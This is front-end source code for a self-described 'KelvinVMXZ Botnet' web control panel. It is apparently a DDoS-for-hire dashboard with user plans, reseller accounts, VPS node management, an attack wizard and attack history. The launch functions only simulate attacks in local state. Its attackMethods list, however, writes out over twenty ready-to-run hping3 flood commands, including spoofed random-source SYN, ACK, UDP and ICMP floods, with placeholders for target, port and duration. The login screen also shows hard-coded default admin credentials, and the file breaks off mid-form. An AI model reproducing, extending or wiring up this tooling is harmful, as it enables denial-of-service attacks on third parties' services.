// Main Application Logic
const { useState, useEffect } = React;

const KelvinVMXZ = () => {
    const [isLoggedIn, setIsLoggedIn] = useState(false);
    const [user, setUser] = useState(null);
    const [activeTab, setActiveTab] = useState('dashboard');
    const [cncStatus, setCncStatus] = useState(false);
    const [vpsList, setVpsList] = useState([]);
    const [ongoingAttacks, setOngoingAttacks] = useState([]);
    const [attackHistory, setAttackHistory] = useState([]);
    const [showAttackModal, setShowAttackModal] = useState(false);
    const [showVpsModal, setShowVpsModal] = useState(false);
    const [showUserModal, setShowUserModal] = useState(false);
    const [selectedMethod, setSelectedMethod] = useState('');
    const [attackTarget, setAttackTarget] = useState({ ip: '', port: '80', duration: '60' });
    const [checkHostResult, setCheckHostResult] = useState(null);
    const [loading, setLoading] = useState(false);
    const [loginError, setLoginError] = useState('');

    // Load data from localStorage on mount
    useEffect(() => {
        const savedVps = localStorage.getItem('kelvinvmxz_vps');
        const savedAttacks = localStorage.getItem('kelvinvmxz_attacks');
        const savedHistory = localStorage.getItem('kelvinvmxz_history');
        
        if (savedVps) setVpsList(JSON.parse(savedVps));
        if (savedAttacks) setOngoingAttacks(JSON.parse(savedAttacks));
        if (savedHistory) setAttackHistory(JSON.parse(savedHistory));
        
        // Start auto-delete for inactive VPS
        window.vpsManager.autoDeleteInactiveVps();
    }, []);

    // Save data to localStorage whenever it changes
    useEffect(() => {
        localStorage.setItem('kelvinvmxz_vps', JSON.stringify(vpsList));
    }, [vpsList]);

    useEffect(() => {
        localStorage.setItem('kelvinvmxz_attacks', JSON.stringify(ongoingAttacks));
    }, [ongoingAttacks]);

    useEffect(() => {
        localStorage.setItem('kelvinvmxz_history', JSON.stringify(attackHistory));
    }, [attackHistory]);

    // Login handler
    const handleLogin = (e) => {
        e.preventDefault();
        const { username, password } = loginForm;
        
        const authenticatedUser = window.userManager.authenticateUser(username, password);
        
        if (authenticatedUser) {
            setIsLoggedIn(true);
            setUser(authenticatedUser);
            setLoginError('');
        } else {
            setLoginError('Invalid username or password');
        }
    };

    // Form states
    const [loginForm, setLoginForm] = useState({ username: '', password: '' });

    // Attack methods
    const attackMethods = [
        { id: 'syn_pps', name: '☠️ SYN-PPS', command: 'sudo timeout {time}s hping3 -S --flood -p {port} {ip}', desc: 'SYN Flood High Packet Rate' },
        { id: 'syn_gbps', name: '🚀 SYN-GBPS', command: 'sudo timeout {time}s hping3 -S --flood --data 65495 -p {port} {ip}', desc: 'SYN Flood Large Packets' },
        { id: 'ack_pps', name: '⚡ ACK-PPS', command: 'sudo timeout {time}s hping3 -A --flood -p {port} {ip}', desc: 'ACK Flood High Packet Rate' },
        { id: 'ack_gbps', name: '🔥 ACK-GBPS', command: 'sudo timeout {time}s hping3 -A --flood --data 65495 -p {port} {ip}', desc: 'ACK Flood Large Packets' },
        { id: 'icmp_pps', name: '🔨 ICMP-PPS', command: 'sudo timeout {time}s hping3 --icmp --flood {ip}', desc: 'ICMP Flood High Packet Rate' },
        { id: 'icmp_gbps', name: '💣 ICMP-GBPS', command: 'sudo timeout {time}s hping3 --icmp --flood --data 65495 {ip}', desc: 'ICMP Flood Large Packets' },
        { id: 'udp_flood', name: '🌊 UDP-FLOOD', command: 'sudo timeout {time}s hping3 --udp --flood -p {port} {ip}', desc: 'UDP Flood Attack' },
        { id: 'tcp_flood', name: '🌪️ TCP-FLOOD', command: 'sudo timeout {time}s hping3 --tcp --flood -p {port} {ip}', desc: 'TCP Flood Attack' },
        { id: 'mixed_syn_ack', name: '🔄 MIXED-SYN/ACK', command: 'sudo timeout {time}s hping3 -S -A --flood -p {port} {ip}', desc: 'Mixed SYN/ACK Flood' },
        { id: 'fragment', name: '💥 FRAGMENT', command: 'sudo timeout {time}s hping3 --frag --flood -p {port} {ip}', desc: 'IP Fragmentation Attack' },
        { id: 'rand_udp', name: '🌀 RAND-UDP', command: 'sudo timeout {time}s hping3 --udp --rand-source --flood -p {port} {ip}', desc: 'Random UDP Source Attack' },
        { id: 'rand_syn', name: '🌪️ RAND-SYN', command: 'sudo timeout {time}s hping3 -S --rand-source --flood -p {port} {ip}', desc: 'Random SYN Source Attack' },
        { id: 'rand_ack', name: '⚡ RAND-ACK', command: 'sudo timeout {time}s hping3 -A --rand-source --flood -p {port} {ip}', desc: 'Random ACK Source Attack' },
        { id: 'rand_icmp', name: '🌀 RAND-ICMP', command: 'sudo timeout {time}s hping3 --icmp --rand-source --flood {ip}', desc: 'Random ICMP Source Attack' },
        { id: 'udp_multi', name: '🎯 UDP-MULTI', command: 'sudo timeout {time}s hping3 --udp --flood -p {port} --rand-port {ip}', desc: 'Multi-Port UDP Flood' },
        { id: 'syn_multi', name: '🌐 SYN-MULTI', command: 'sudo timeout {time}s hping3 -S --flood -p {port} --rand-port {ip}', desc: 'Multi-Port SYN Flood' },
        { id: 'oblivion', name: '💀 OBLIVION', command: 'sudo timeout {time}s hping3 -S -A --flood --rand-source -p {port} {ip}', desc: 'Oblivion Attack (All Protocols)' },
        { id: 'file_attack', name: '📁 FILE-ATTACK', command: 'sudo timeout {time}s hping3 -S --flood -p {port} {ip} < /dev/zero', desc: 'File-Based Attack' },
        { id: 'ack_rmac', name: '⚡ ACK-RMAC', command: 'sudo timeout {time}s hping3 -A --flood --rand-mac -p {port} {ip}', desc: 'Random MAC ACK Flood' },
        { id: 'syn_rand', name: '🌪️ SYN-RAND', command: 'sudo timeout {time}s hping3 -S --flood --rand-tos -p {port} {ip}', desc: 'Random TOS SYN Flood' },
        { id: 'udp_sip', name: '📞 UDP-SIP', command: 'sudo timeout {time}s hping3 --udp --flood -p 5060 {ip}', desc: 'SIP Protocol Attack' },
        { id: 'icmp_ts', name: '📡 ICMP-TS', command: 'sudo timeout {time}s hping3 --icmp --flood --icmp-ts {ip}', desc: 'ICMP Timestamp Flood' },
        { id: 'rand_frpu', name: '💥 RAND-FRPU', command: 'sudo timeout {time}s hping3 --udp --flood --rand-dest -p {port} {ip}', desc: 'Random Destination Flood' }
    ];

    // Simulasi start CNC
    const startCNC = () => {
        setCncStatus(true);
        const newVpsList = [
            { host: 'vps1.example.com', username: 'root', password: '***', status: 'online' },
            { host: 'vps2.example.com', username: 'root', password: '***', status: 'online' },
            { host: 'vps3.example.com', username: 'root', password: '***', status: 'online' }
        ];
        setVpsList(newVpsList);
    };

    // Simulasi stop CNC
    const stopCNC = () => {
        setCncStatus(false);
        setVpsList([]);
        setOngoingAttacks([]);
    };

    // Simulasi serangan
    const executeAttack = () => {
        if (!attackTarget.ip) return;
        
        setLoading(true);
        setTimeout(() => {
            const attack = {
                id: Date.now().toString(),
                target: attackTarget.ip,
                port: attackTarget.port,
                method: selectedMethod,
                duration: attackTarget.duration,
                startTime: new Date().toISOString(),
                status: 'running',
                user: user.username
            };
            
            setOngoingAttacks([...ongoingAttacks, attack]);
            
            setTimeout(() => {
                const completedAttack = { ...attack, status: 'completed', endTime: new Date().toISOString() };
                setOngoingAttacks(ongoingAttacks.filter(a => a.id !== attack.id));
                setAttackHistory([...attackHistory, completedAttack]);
            }, attackTarget.duration * 1000);
            
            setLoading(false);
            setShowAttackModal(false);
        }, 1000);
    };

    // Simulasi check host
    const checkHost = () => {
        setLoading(true);
        setTimeout(() => {
            const result = {
                target: `${attackTarget.ip}:${attackTarget.port}`,
                status: 'online',
                nodes: [
                    { name: 'us1.node.check-host.net', status: 'online', response: '12ms' },
                    { name: 'de1.node.check-host.net', status: 'online', response: '45ms' },
                    { name: 'sg1.node.check-host.net', status: 'online', response: '89ms' },
                    { name: 'jp1.node.check-host.net', status: 'online', response: '156ms' },
                    { name: 'br1.node.check-host.net', status: 'online', response: '234ms' }
                ],
                statistics: {
                    online: 5,
                    offline: 0,
                    timeout: 0,
                    success_rate: '100%'
                }
            };
            setCheckHostResult(result);
            setLoading(false);
        }, 2000);
    };

    // Tambah VPS
    const addVPS = () => {
        if (vpsForm.host) {
            const newVps = { ...vpsForm, status: 'pending' };
            setVpsList([...vpsList, newVps]);
            setVpsForm({ host: '', username: 'root', password: '' });
            setShowVpsModal(false);
        }
    };

    // Tambah user
    const addUser = () => {
        if (userForm.username) {
            const newUser = { ...userForm, reseller: userForm.reseller === 'true' || userForm.reseller === true };
            window.userManager.addUser(newUser.username, newUser.password, newUser.plan, newUser.reseller);
            setUser({ ...user, ...newUser });
            setUserForm({ username: '', plan: 'free', reseller: false });
            setShowUserModal(false);
        }
    };

    // Stop semua serangan
    const stopAllAttacks = () => {
        setOngoingAttacks([]);
        setAttackHistory(attackHistory.map(a => ({ ...a, status: 'stopped' })));
    };

    // Form states
    const [vpsForm, setVpsForm] = useState({ host: '', username: 'root', password: '' });
    const [userForm, setUserForm] = useState({ username: '', plan: 'free', reseller: false });

    if (!isLoggedIn) {
        return (
            <div className="min-h-screen gradient-bg flex items-center justify-center">
                <div className="glass-effect rounded-2xl p-8 w-96 text-white login-container">
                    <div className="text-center mb-8">
                        <div className="w-20 h-20 bg-white bg-opacity-20 rounded-full flex items-center justify-center mx-auto mb-4">
                            <i className="fas fa-shield-alt text-3xl"></i>
                        </div>
                        <h1 className="text-2xl font-bold mb-2">KelvinVMXZ Botnet</h1>
                        <p className="text-sm opacity-80">Web Control Panel</p>
                    </div>
                    
                    <form onSubmit={handleLogin} className="space-y-4 login-form">
                        <div>
                            <input
                                type="text"
                                value={loginForm.username}
                                onChange={(e) => setLoginForm({...loginForm, username: e.target.value})}
                                className="w-full px-4 py-2 rounded-lg bg-white bg-opacity-20 border border-white border-opacity-30 text-white placeholder-white placeholder-opacity-60 focus:outline-none focus:ring-2 focus:ring-white focus:ring-opacity-50 login-input"
                                placeholder="Username"
                                required
                            />
                        </div>
                        
                        <div>
                            <input
                                type="password"
                                value={loginForm.password}
                                onChange={(e) => setLoginForm({...loginForm, password: e.target.value})}
                                className="w-full px-4 py-2 rounded-lg bg-white bg-opacity-20 border border-white border-opacity-30 text-white placeholder-white placeholder-opacity-60 focus:outline-none focus:ring-2 focus:ring-white focus:ring-opacity-50 login-input"
                                placeholder="Password"
                                required
                            />
                        </div>
                        
                        {loginError && (
                            <div className="text-red-400 text-sm text-center">{loginError}</div>
                        )}
                        
                        <button
                            type="submit"
                            className="w-full py-3 bg-white bg-opacity-20 hover:bg-opacity-30 rounded-lg font-semibold transition-all duration-300 login-button"
                        >
                            Login
                        </button>
                    </form>
                    
                    <div className="mt-6 text-center text-xs opacity-60 credentials-note">
                        <p>Default Credentials:</p>
                        <p>Username: admin</p>
                        <p>Password: kelvinvmxz</p>
                    </div>
                </div>
            </div>
        );
    }

    return (
        <div className="min-h-screen gradient-bg">
            {/* Header */}
            <header className="glass-effect px-6 py-4 header">
                <div className="flex items-center space-x-4">
                    <div className="flex items-center space-x-4">
                        <div className="w-10 h-10 bg-white bg-opacity-20 rounded-lg flex items-center justify-center">
                            <i className="fas fa-network-wired text-white"></i>
                        </div>
                        <div>
                            <h1 className="text-xl font-bold text-white">KelvinVMXZ Botnet</h1>
                            <p className="text-xs text-white opacity-80">Web Control Panel</p>
                        </div>
                    </div>
                    
                    <div className="flex items-center space-x-4 ml-auto">
                        <div className="text-white">
                            <span className="text-sm opacity-80">User:</span>
                            <span className="ml-2 font-semibold">{user.username}</span>
                        </div>
                        <div className="text-white">
                            <span className="text-sm opacity-80">Plan:</span>
                            <span className="ml-2 font-semibold">{user.plan.toUpperCase()}</span>
                        </div>
                        <button
                            onClick={() => setIsLoggedIn(false)}
                            className="px-4 py-2 bg-red-500 bg-opacity-20 hover:bg-opacity-30 rounded-lg text-white text-sm transition-all duration-300"
                        >
                            Logout
                        </button>
                    </div>
                </div>
            </header>

            {/* Navigation */}
            <nav className="glass-effect px-6 nav-tabs">
                <div className="flex space-x-2">
                    {[
                        { id: 'dashboard', name: 'Dashboard', icon: 'fas fa-tachometer-alt' },
                        { id: 'attack', name: 'Attack Hub', icon: 'fas fa-bolt' },
                        { id: 'vps', name: 'VPS Management', icon: 'fas fa-server' },
                        { id: 'users', name: 'Users', icon: 'fas fa-users' },
                        { id: 'history', name: 'Attack History', icon: 'fas fa-history' },
                        { id: 'checkhost', name: 'Check Host', icon: 'fas fa-search' }
                    ].map(tab => (
                        <button
                            key={tab.id}
                            onClick={() => setActiveTab(tab.id)}
                            className={`px-4 py-3 rounded-lg font-medium transition-all duration-300 tab-button ${activeTab === tab.id ? 'active' : ''}`}
                        >
                            <i className={`${tab.icon} mr-2`}></i>
                            {tab.name}
                        </button>
                    ))}
                </div>
            </nav>

            {/* Main Content */}
            <main className="p-6 main-content">
                {activeTab === 'dashboard' && (
                    <div className="space-y-6">
                        {/* Status Cards */}
                        <div className="grid grid-cols-1 md:grid-cols-4 gap-4 status-cards">
                            <div className="glass-effect rounded-xl p-6 text-white status-card">
                                <div className="flex items-center justify-between">
                                    <div>
                                        <p className="text-sm opacity-80">CNC Status</p>
                                        <p className="text-2xl font-bold">
                                            {cncStatus ? (
                                                <span className="text-green-400">🟢 ACTIVE</span>
                                            ) : (
                                                <span className="text-red-400">🔴 INACTIVE</span>
                                            )}
                                        </p>
                                    </div>
                                    <div className="text-3xl opacity-50">
                                        <i className="fas fa-server"></i>
                                    </div>
                                </div>
                            </div>
                            
                            <div className="glass-effect rounded-xl p-6 text-white status-card">
                                <div className="flex items-center justify-between">
                                    <div>
                                        <p className="text-sm opacity-80">VPS Nodes</p>
                                        <p className="text-2xl font-bold">{vpsList.length}</p>
                                    </div>
                                    <div className="text-3xl opacity-50">
                                        <i className="fas fa-network-wired"></i>
                                    </div>
                                </div>
                            </div>
                            
                            <div className="glass-effect rounded-xl p-6 text-white status-card">
                                <div className="flex items-center justify-between">
                                    <div>
                                        <p className="text-sm opacity-80">Ongoing Attacks</p>
                                        <p className="text-2xl font-bold">{ongoingAttacks.length}</p>
                                    </div>
                                    <div className="text-3xl opacity-50">
                                        <i className="fas fa-bolt"></i>
                                    </div>
                                </div>
                            </div>
                            
                            <div className="glass-effect rounded-xl p-6 text-white status-card">
                                <div className="flex items-center justify-between">
                                    <div>
                                        <p className="text-sm opacity-80">Total Methods</p>
                                        <p className="text-2xl font-bold">{attackMethods.length}</p>
                                    </div>
                                    <div className="text-3xl opacity-50">
                                        <i className="fas fa-code"></i>
                                    </div>
                                </div>
                            </div>
                        </div>

                        {/* Action Buttons */}
                        <div className="glass-effect rounded-xl p-6">
                            <h2 className="text-xl font-bold text-white mb-4">Quick Actions</h2>
                            <div className="grid grid-cols-2 md:grid-cols-4 gap-4 quick-actions">
                                <button
                                    onClick={() => setShowAttackModal(true)}
                                    className="bg-gradient-to-r from-purple-500 to-pink-500 hover:from-purple-600 hover:to-pink-600 text-white py-3 px-4 rounded-lg font-semibold transition-all duration-300 transform hover:scale-105 action-button"
                                >
                                    <i className="fas fa-bolt mr-2"></i>
                                    Launch Attack
                                </button>
                                
                                <button
                                    onClick={startCNC}
                                    className="bg-gradient-to-r from-green-500 to-teal-500 hover:from-green-600 hover:to-teal-600 text-white py-3 px-4 rounded-lg font-semibold transition-all duration-300 transform hover:scale-105 action-button"
                                >
                                    <i className="fas fa-play mr-2"></i>
                                    Start CNC
                                </button>
                                
                                <button
                                    onClick={stopCNC}
                                    className="bg-gradient-to-r from-red-500 to-orange-500 hover:from-red-600 hover:to-orange-600 text-white py-3 px-4 rounded-lg font-semibold transition-all duration-300 transform hover:scale-105 action-button"
                                >
                                    <i className="fas fa-stop mr-2"></i>
                                    Stop CNC
                                </button>
                                
                                <button
                                    onClick={() => setShowVpsModal(true)}
                                    className="bg-gradient-to-r from-blue-500 to-indigo-500 hover:from-blue-600 hover:to-indigo-600 text-white py-3 px-4 rounded-lg font-semibold transition-all duration-300 transform hover:scale-105 action-button"
                                >
                                    <i className="fas fa-plus mr-2"></i>
                                    Add VPS
                                </button>
                            </div>
                        </div>

                        {/* Ongoing Attacks */}
                        {ongoingAttacks.length > 0 && (
                            <div className="glass-effect rounded-xl p-6 ongoing-attacks">
                                <div className="flex items-center justify-between mb-4">
                                    <h2 className="text-xl font-bold text-white">Ongoing Attacks</h2>
                                    <button
                                        onClick={stopAllAttacks}
                                        className="bg-red-500 bg-opacity-20 hover:bg-opacity-30 text-white px-4 py-2 rounded-lg text-sm transition-all duration-300"
                                    >
                                        Stop All
                                    </button>
                                </div>
                                <div className="space-y-3">
                                    {ongoingAttacks.map(attack => (
                                        <div key={attack.id} className="bg-white bg-opacity-10 rounded-lg p-4 attack-item">
                                            <div>
                                                <p className="text-white font-semibold">{attack.method}</p>
                                                <p className="text-sm text-white opacity-80">{attack.target}:{attack.port}</p>
                                            </div>
                                            <div className="text-right">
                                                <span className={`attack-status status-${attack.status.toLowerCase()}`}>
                                                    {attack.status.toUpperCase()}
                                                </span>
                                                <p className="text-white text-sm mt-1">{attack.duration}s</p>
                                            </div>
                                        </div>
                                    ))}
                                </div>
                            </div>
                        )}
                    </div>
                )}

                {activeTab === 'attack' && (
                    <div className="glass-effect rounded-xl p-6">
                        <h2 className="text-2xl font-bold text-white mb-6">Attack Wizard</h2>
                        
                        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                            {/* Attack Configuration */}
                            <div>
                                <h3 className="text-lg font-semibold text-white mb-4">Attack Configuration</h3>
                                <div className="space-y-4">
                                    <div>
                                        <label className="block text-white mb-2">Target IP</label>
                                        <input
                                            type="text"
                                            value={attackTarget.ip}
                                            onChange={(e) => setAttackTarget({...attackTarget, ip: e.target.value})}
                                            className="w-full px-4 py-2 rounded-lg bg-white bg-opacity-20 border border-white border-opacity-30 text-white placeholder-white placeholder-opacity-60 focus:outline-none focus:ring-2 focus:ring-white focus:ring-opacity-50"
                                            placeholder="192.168.1.1"
                                        />
                                    </div>
                                    
                                    <div>
                                        <label className="block text-white mb-2">Target Port</label>
                                        <input
                                            type="text"
                                            value={attackTarget.port}
                                            onChange={(e) => setAttackTarget({...attackTarget, port: e.target.value})}
                                            className="w-full px-4 py-2 rounded-lg bg-white bg-opacity-20 border border-white border-opacity-30 text-white placeholder-white placeholder-opacity-60 focus:outline-none focus:ring-2 focus:ring-white focus:ring-opacity-50"
                                            placeholder="80"
                                        />
                                    </div>
                                    
                                    <div>
                                        <label className="block text-white mb-2">Duration (seconds)</label>
                                        <input
                                            type="number"
                                            value={attackTarget.duration}
                                            onChange={(e) => setAttackTarget({...attackTarget, duration: e.target.value})}
                                            className="w-full px-4 py-2 rounded-lg bg-white bg-opacity-20 border border-white border-opacity-30 text-white placeholder-white placeholder-opacity-60 focus:outline-none focus:ring-2 focus:ring-white focus:ring-opacity-50"
                                            placeholder="60"
                                        />
                                    </div>
                                </div>
                            </div>
                            
                            {/* Attack Methods */}
                            <div>
                                <h3 className="text-lg font-semibold text-white mb-4">Select Attack Method</h3>
                                <div className="grid grid-cols-2 gap-3 max-h-96 overflow-y-auto">
                                    {attackMethods.map(method => (
                                        <button
                                            key={method.id}
                                            onClick={() => setSelectedMethod(method.id)}
                                            className={`attack-card p-4 rounded-lg text-left transition-all duration-300 ${
                                                selectedMethod === method.id
                                                    ? 'bg-gradient-to-r from-purple-500 to-pink-500 text-white'
                                                    : 'bg-white bg-opacity-10 text-white hover:bg-opacity-20'
                                            }`}
                                        >
                                            <div className="font-semibold">{method.name}</div>
                                            <div className="text-sm opacity-80 mt-1">{method.desc}</div>
                                        </button>
                                    ))}
                                </div>
                            </div>
                        </div>
                        
                        <div className="mt-6 flex justify-center">
                            <button
                                onClick={executeAttack}
                                disabled={!attackTarget.ip || !selectedMethod || loading}
                                className="bg-gradient-to-r from-purple-500 to-pink-500 hover:from-purple-600 hover:to-pink-600 text-white py-3 px-8 rounded-lg font-semibold transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed"
                            >
                                {loading ? 'Launching...' : 'Launch Attack'}
                            </button>
                        </div>
                    </div>
                )}

                {activeTab === 'vps' && (
                    <div className="glass-effect rounded-xl p-6">
                        <div className="flex items-center justify-between mb-6">
                            <h2 className="text-2xl font-bold text-white">VPS Management</h2>
                            <button
                                onClick={() => setShowVpsModal(true)}
                                className="bg-gradient-to-r from-blue-500 to-indigo-500 hover:from-blue-600 hover:to-indigo-600 text-white py-2 px-4 rounded-lg font-semibold transition-all duration-300"
                            >
                                <i className="fas fa-plus mr-2"></i>
                                Add VPS
                            </button>
                        </div>
                        
                        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                            {vpsList.map((vps, index) => (
                                <div key={index} className="bg-white bg-opacity-10 rounded-lg p-4">
                                    <div className="flex items-center justify-between mb-3">
                                        <h3 className="text-white font-semibold">{vps.host}</h3>
                                        <span className={`px-2 py-1 rounded-full text-xs font-semibold ${
                                            vps.status === 'online' 
                                                ? 'bg-green-500 bg-opacity-20 text-green-400' 
                                                : 'bg-yellow-500 bg-opacity-20 text-yellow-400'
                                        }`}>
                                            {vps.status.toUpperCase()}
                                        </span>
                                    </div>
                                    <div className="text-white opacity-80 text-sm space-y-1">
                                        <p>Username: {vps.username}</p>
                                        <p>Password: {vps.password}</p>
                                    </div>
                                </div>
                            ))}
                        </div>
                    </div>
                )}

                {activeTab === 'users' && (
                    <div className="glass-effect rounded-xl p-6">
                        <div className="flex items-center justify-between mb-6">
                            <h2 className="text-2xl font-bold text-white">User Management</h2>
                            <button
                                onClick={() => setShowUserModal(true)}
                                className="bg-gradient-to-r from-blue-500 to-indigo-500 hover:from-blue-600 hover:to-indigo-600 text-white py-2 px-4 rounded-lg font-semibold transition-all duration-300"
                            >
                                <i className="fas fa-plus mr-2"></i>
                                Add User
                            </button>
                        </div>
                        
                        <div className="bg-white bg-opacity-10 rounded-lg p-4">
                            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                                <div className="text-center">
                                    <p className="text-white opacity-80">Username</p>
                                    <p className="text-white font-semibold">{user.username}</p>
                                </div>
                                <div className="text-center">
                                    <p className="text-white opacity-80">Plan</p>
                                    <p className="text-white font-semibold">{user.plan.toUpperCase()}</p>
                                </div>
                                <div className="text-center">
                                    <p className="text-white opacity-80">Reseller</p>
                                    <p className="text-white font-semibold">{user.reseller ? 'YES' : 'NO'}</p>
                                </div>
                            </div>
                        </div>
                    </div>
                )}

                {activeTab === 'history' && (
                    <div className="glass-effect rounded-xl p-6">
                        <h2 className="text-2xl font-bold text-white mb-6">Attack History</h2>
                        <div className="space-y-4">
                            {attackHistory.map(attack => (
                                <div key={attack.id} className="bg-white bg-opacity-10 rounded-lg p-4 attack-item">
                                    <div>
                                        <p className="text-white font-semibold">{attack.method}</p>
                                        <p className="text-sm text-white opacity-80">{attack.target}:{attack.port}</p>
                                    </div>
                                    <div className="text-right">
                                        <span className={`attack-status status-${attack.status.toLowerCase()}`}>
                                            {attack.status.toUpperCase()}
                                        </span>
                                        <p className="text-white text-sm mt-1">{attack.duration}s</p>
                                    </div>
                                </div>
                            ))}
                        </div>
                    </div>
                )}

                {activeTab === 'checkhost' && (
                    <div className="glass-effect rounded-xl p-6">
                        <h2 className="text-2xl font-bold text-white mb-6">Check Host Status</h2>
                        
                        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                            <div>
                                <h3 className="text-lg font-semibold text-white mb-4">Check Configuration</h3>
                                <div className="space-y-4 check-form">
                                    <div>
                                        <label className="block text-white mb-2">Target IP:PORT</label>
                                        <input
                                            type="text"
                                            value={attackTarget.ip}
                                            onChange={(e) => setAttackTarget({...attackTarget, ip: e.target.value})}
                                            className="w-full px-4 py-2 rounded-lg bg-white bg-opacity-20 border border-white border-opacity-30 text-white placeholder-white placeholder-opacity-60 focus:outline-none focus:ring-2 focus:ring-white focus:ring-opacity-50 check-input"
                                            placeholder="192.168.1.1:80"
                                        />
                                    </div>
                                    
                                    <button
                                        onClick={checkHost}
                                        disabled={!attackTarget.ip || loading}
                                        className="w-full bg-gradient-to-r from-green-500 to-teal-500 hover:from-green-600 hover:to-teal-600 text-white py-3 px-4 rounded-lg font-semibold transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed check-button"
                                    >
                                        {loading ? 'Checking...' : 'Check Host'}
                                    </button>
                                </div>
                            </div>
                            
                            <div>
                                <h3 className="text-lg font-semibold text-white mb-4">Results</h3>
                                {checkHostResult ? (
                                    <div className="bg-white bg-opacity-10 rounded-lg p-4 check-results">
                                        <div className="space-y-3">
                                            <div className="flex items-center justify-between result-item">
                                                <span className="result-label">Target:</span>
                                                <span className="result-value">{checkHostResult.target}</span>
                                            </div>
                                            <div className="flex items-center justify-between result-item">
                                                <span className="result-label">Status:</span>
                                                <span className="result-value text-green-400">ONLINE</span>
                                            </div>
                                            <div className="flex items-center justify-between result-item">
                                                <span className="result-label">Success Rate:</span>
                                                <span className="result-value">{checkHostResult.statistics.success_rate}</span>
                                            </div>
                                            
                                            <div className="mt-4">
                                                <h4 className="text-white font-semibold mb-2">Node Results:</h4>
                                                <div className="space-y-2 node-results">
                                                    {checkHostResult.nodes.map((node, index) => (
                                                        <div key={index} className="flex items-center justify-between text-sm node-item">
                                                            <span className="text-white opacity-80">{node.name}</span>
                                                            <span className={`node-status status-${node.status.toLowerCase()}`}>
                                                                {node.status.toUpperCase()} - {node.response}
                                                            </span>
                                                        </div>
                                                    ))}
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                ) : (
                                    <div className="bg-white bg-opacity-10 rounded-lg p-4 text-center text-white opacity-60">
                                        <i className="fas fa-search text-3xl mb-2"></i>
                                        <p>No results yet</p>
                                    </div>
                                )}
                            </div>
                        </div>
                    </div>
                )}
            </main>

            {/* Attack Modal */}
            {showAttackModal && (
                <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
                    <div className="glass-effect rounded-xl p-6 w-full max-w-2xl mx-4">
                        <div className="flex items-center justify-between mb-4">
                            <h2 className="text-xl font-bold text-white">Launch Attack</h2>
                            <button
                                onClick={() => setShowAttackModal(false)}
                                className="text-white opacity-60 hover:opacity-100"
                            >
                                <i className="fas fa-times"></i>
                            </button>
                        </div>
                        
                        <div className="space-y-4">
                            <div>
                                <label className="block text-white mb-2">Target IP</label>
                                <input
                                    type="text"
                                    value={attackTarget.ip}
                                    onChange={(e) => setAttackTarget({...attackTarget, ip: e.target.value})}
                                    className="w-full px-4 py-2 rounded-lg bg-white bg-opacity-20 border border-white border-opacity-30 text-white placeholder-white placeholder-opacity-60 focus:outline-none focus:ring-2 focus:ring-white focus:ring-opacity-50"
                                    placeholder="192.168.1.1"
                                />
                            </div>
                            
                            <div>
                                <label className="block text-white mb-2">Target Port</label>
                                <input
                                    type="text"
                                    value={attackTarget.port}
                                    onChange={(e) => setAttackTarget({...attackTarget, port: e.target.value})}
                                    className="w-full px-4 py-2 rounded-lg bg-white bg-opacity-20 border border-white border-opacity-30 text-white placeholder-white placeholder-opacity-60 focus:outline-none focus:ring-2 focus:ring-white focus:ring-opacity-50"
                                    placeholder="80"
                                />
                            </div>
                            
                            <div>
                                <label className="block text-white mb-2">Duration (seconds)</label>
                                <input
                                    type="number"
                                    value={attackTarget.duration}
                                    onChange={(e) => setAttackTarget({...attackTarget, duration: e.target.value})}
                                    className="w-full px-4 py-2 rounded-lg bg-white bg-opacity-20 border border-white border-opacity-30 text-white placeholder-white placeholder-opacity-60 focus:outline-none focus:ring-2 focus:ring-white focus:ring-opacity-50"
                                    placeholder="60"
                                />
                            </div>
                            
                            <div>
                                <label className="block text-white mb-2">Attack Method</label>
                                <select
                                    value={selectedMethod}
                                    onChange={(e) => setSelectedMethod(e.target.value)}
                                    className="w-full px-4 py-2 rounded-lg bg-white bg-opacity-20 border border-white border-opacity-30 text-white focus:outline-none focus:ring-2 focus:ring-white focus:ring-opacity-50"
                                >
                                    <option value="">Select a method</option>
                                    {attackMethods.map(method => (
                                        <option key={method.id} value={method.id}>{method.name}</option>
                                    ))}
                                </select>
                            </div>
                        </div>
                        
                        <div className="flex justify-end space-x-3 mt-6">
                            <button
                                onClick={() => setShowAttackModal(false)}
                                className="px-4 py-2 bg-white bg-opacity-20 hover:bg-opacity-30 text-white rounded-lg transition-all duration-300"
                            >
                                Cancel
                            </button>
                            <button
                                onClick={executeAttack}
                                disabled={!attackTarget.ip || !selectedMethod || loading}
                                className="px-4 py-2 bg-gradient-to-r from-purple-500 to-pink-500 hover:from-purple-600 hover:to-pink-600 text-white rounded-lg font-semibold transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed"
                            >
                                Launch Attack
                            </button>
                        </div>
                    </div>
                </div>
            )}

            {/* VPS Modal */}
            {showVpsModal && (
                <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
                    <div className="glass-effect rounded-xl p-6 w-full max-w-md mx-4">
                        <div className="flex items-center justify-between mb-4">
                            <h2 className="text-xl font-bold text-white">Add VPS</h2>
                            <button
                                onClick={() => setShowVpsModal(false)}
                                className="text-white opacity-60 hover:opacity-100"
                            >
                                <i className="fas fa-times"></i>
                            </button>
                        </div>
                        
                        <div className="space-y-4">
                            <div>
                                <label className="block text-white mb-2">Host/IP</label>
                                <input
                                    type="text"
                                    value={vpsForm.host}
                                    onChange={(e) => setVpsForm({...vpsForm, host: e.target.value})}
                                    className="w-full px-4 py-2 rounded-lg bg-white bg-opacity-20 border border-white border-opacity-30 text-white placeholder-white placeholder-opacity-60 focus:outline-none focus:ring-2 focus:ring-white focus:ring-opacity-50"
                                    placeholder="vps.example.com"
                                />
                            </div>
                            
                            <div>
                                <label className="block text-white mb-2">Username</label>
                                <input
                                    type="text"
                                    value={vpsForm.username}
                                    onChange={(e) => setVpsForm({...vpsForm, username: e.target.value})}
                                    className="w-full px-4 py-2 rounded-lg bg-white bg-opacity-20 border border-white border-opacity-30 text-white placeholder-white placeholder-opacity-60 focus:outline-none focus:ring-2 focus:ring-white focus:ring-opacity-50"
                                    placeholder="root"
                                />
                            </div>
                            
                            <div>
